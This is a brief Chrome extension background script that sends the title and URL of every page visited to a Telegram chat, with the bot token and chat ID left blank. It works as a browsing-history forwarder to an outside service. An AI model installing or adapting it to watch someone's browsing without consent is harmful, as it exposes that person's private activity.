"use strict";

chrome.webNavigation.onCompleted.addListener((details) => {
    const url = details.url;
    const TOKEN = ""; // Replace with your Telegram bot token
    const chatId = ""; // Replace with your chat ID or recipient's user ID
    
    chrome.tabs.get(details.tabId, function (tab) {
        const tabTitle = tab.title;
        const message = `You  visited ${tabTitle} (${url})`; // You can Change message  according your need
        
        const xhr = new XMLHttpRequest();
        xhr.withCredentials = false;
        xhr.addEventListener("readystatechange", function () {
            if (this.readyState === this.DONE) {
                console.log(this.responseText);
            }
        });
        
        xhr.open("GET", `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
        xhr.send();
    });
});
